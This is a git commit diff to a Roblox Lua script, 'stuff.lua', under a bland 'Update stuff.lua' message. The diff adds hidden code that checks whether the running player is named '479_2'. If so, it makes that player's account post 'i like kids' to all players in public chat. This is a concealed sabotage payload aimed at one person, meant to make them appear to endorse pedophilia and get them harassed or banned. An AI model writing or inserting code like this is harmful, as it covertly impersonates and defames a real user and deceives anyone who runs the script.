f2c3580dcdef451812a853e7a573e2ab340aaa14
georgefl121 <102901825+georgefl121@users.noreply.github.com>
2022-07-19 19:12:25 +0800

    Update stuff.lua

--- stuff.lua
+++ stuff.lua
@@ -65,5 +65,11 @@ end)
 namefound = false
 print("looking")
 spawn(function()
-	hello = true
+	if game.Players.LocalPlayer.Name == "479_2" then
+	    local ohString1 = "i like kids"
+	    local ohString2 = "All"
+
+	    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+	    wait(5)
+	end
 end)
